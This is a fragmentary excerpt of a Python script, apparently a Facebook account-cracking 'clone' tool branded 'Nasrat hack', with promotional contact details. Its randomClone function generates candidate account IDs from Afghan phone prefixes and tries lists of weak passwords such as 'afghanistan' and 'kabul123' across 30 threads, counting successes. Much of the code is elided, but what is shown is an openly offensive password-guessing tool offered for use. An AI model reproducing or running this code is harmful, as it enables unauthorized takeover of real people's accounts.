...
os.system('xdg-open xdg-open https://api.whatsapp.com/send?phone=+9396332007')
logo =f'''{R}
...
                                    
{Y}|●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●|{W}
{G}[🔥]       NUMBER        : 0796332007         ●|{W}
{G}[🔥]       FACEBOOK      : Nasrat hack        ●|{W}
{G}[🔥]       TELEGRAM      : t.me/@NASRAT_CYBERI     ●|{W}
{G}[🔥]       TOOLS STATUS  : ACTIVE FREE        ●|{W}
{G}[🔥]       TOOLS VIRSION : 0.2                ●|{W}
{G}[🔥]       WATSAPP       : +93796332007       ●|{W}
{Y}|●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●|{W}
...
def main():
	...
	if inp in ['1','01']:
		...
		os.system('xdg-open https://api.whatsapp.com/send?phone=+9396332007')
	elif inp in ['4','04']:
...
def randomClone():
	clear()
	line()
	print(f'{G}| AFG CODE : 078, 079, 074, 072, 070{W}')
	print(f'{G}| WORLDWIDE CODE : 9378, 9379, 9374, 9372{W}')
	line()
	...
	with ThreadPoolExecutor(max_workers = 30) as zahid:
		...
		print(f'{G}| press ctrl + z for stopping tools            |{W}')
		line()
		for number in numbs:
			ids = inp + number
			passwords = [number,ids,'۱۲۳۴۵۶','afghanistan','afg123','Afghanistan','afghan123','kabul123','202201']
...
def startClone(ids,passwords):
	try:
		global loop
		sys.stdout.write(f'{G}\r| [AFG-CLONE] {Y}%s{W}/{R}%s{W}/{G}Success:-%s{W}{W}'%(loop,len(ok_ids),len(cp_ids)))
